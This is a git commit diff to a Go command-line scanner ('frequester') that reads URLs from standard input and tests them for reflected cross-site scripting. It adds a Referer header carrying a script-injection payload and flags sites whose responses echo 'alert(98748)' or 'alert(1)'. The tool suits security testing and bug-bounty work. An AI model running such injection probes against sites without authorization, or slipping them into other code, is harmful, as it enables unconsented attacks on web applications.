82db020ccec0639f574f3fa11c7d4153fdf78171
Kaio Gomes <kg6370694@gmail.com>
2022-04-25 14:03:30 -0300

    Update main.go

--- main.go
+++ main.go
@@ -4,22 +4,25 @@ import (
 	"sync"
 	"bufio"
 	"net/http"
-	"fmt"
+    "flag"
+    "fmt"
 	"os"
 	"strings"
 	"io/ioutil"
 )
 
 func main(){
-	// fmt.Println("\n")
-	fmt.Println("frequester tool By tojojo !!")
-	fmt.Println("\\__(-_-)__/")
-	// fmt.Println("\n")
+	fmt.Println("\n")
+	fmt.Println("Frequester tool By tojojo !!")
+	fmt.Println("Enhanced by KaioGomes")
+	fmt.Println("\n")
 
 	colorReset := "\033[0m"
 	colorRed := "\033[31m"
     colorGreen := "\033[32m"
 
+	silent := flag.Bool("silent", false, "display findings only")
+	flag.Parse()
 
 	sc := bufio.NewScanner(os.Stdin)
 
@@ -27,42 +30,66 @@ func main(){
 	var wg sync.WaitGroup
 
 	for i:= 0; i < 20; i++{
-
 		wg.Add(1)
 		go func(){
 			defer wg.Done()
 			for domain := range jobs {
+				client := &http.Client{}
+				req, err := http.NewRequest("GET", domain, nil)
+				req.Header.Add("Referer", `http://google.com/aa?x="()&%</meta>';</script><script>alert(98748)</script><!--`)
+				resp, err := client.Do(req)
 
-				resp, err := http.Get(domain)
 				if err != nil{
 					continue
 				}
+				
 				body, err := ioutil.ReadAll(resp.Body)
 				if err != nil {
 	      			fmt.Println(err)
 	   			}
 	   			sb := string(body)
-	   			check_result := strings.Contains(sb , "alert(1)")
-	   			// fmt.Println(check_result)
+	   			check_result := strings.Contains(sb , "alert(98748)")
 	   			if check_result != false {
-	   				fmt.Println(string(colorRed),"Vulnerable To XSS:", domain,string(colorReset))
+	   				fmt.Println(string(colorRed), "[REFERER XSS] - Vulnerable To XSS:", domain, string(colorReset))
 	   			}else{
-	   				fmt.Println(string(colorGreen),"Not Vulnerable To XSS:", domain, string(colorReset))
+					if *silent != true {
+						fmt.Println(string(colorGreen), "[REFERER XSS] - Not Vulnerable To XSS:", domain, string(colorReset))	
+					}
 	   			}
 
-			}
+
+				// ============================================================================================================ //
+
+
+				client2 := &http.Client{}
+				req2, err2 := http.NewRequest("GET", domain, nil)
+				resp2, err2 := client2.Do(req2)
+
 			
+				if err2 != nil{
+					continue
+				}
+				
+				body2, err2 := ioutil.ReadAll(resp2.Body)
+				if err2 != nil {
+	      			fmt.Println(err2)
+	   			}
+	   			sb2 := string(body2)
+	   			check_result2 := strings.Contains(sb2 , "alert(1)")
+	   			if check_result2 != false {
+	   				fmt.Println(string(colorRed), "[QUERY] - Vulnerable To XSS:", domain, string(colorReset))
+	   			}else{
+					if *silent != true {
+						fmt.Println(string(colorGreen), "[QUERY] - Not Vulnerable To XSS:", domain, string(colorReset))	
+					}
+	   			}
+			}
    		}()
 
 	}
-
-
-
 	for sc.Scan(){
 		domain := sc.Text()
 		jobs <- domain		
-		
-
 	}
 	close(jobs)
 	wg.Wait()
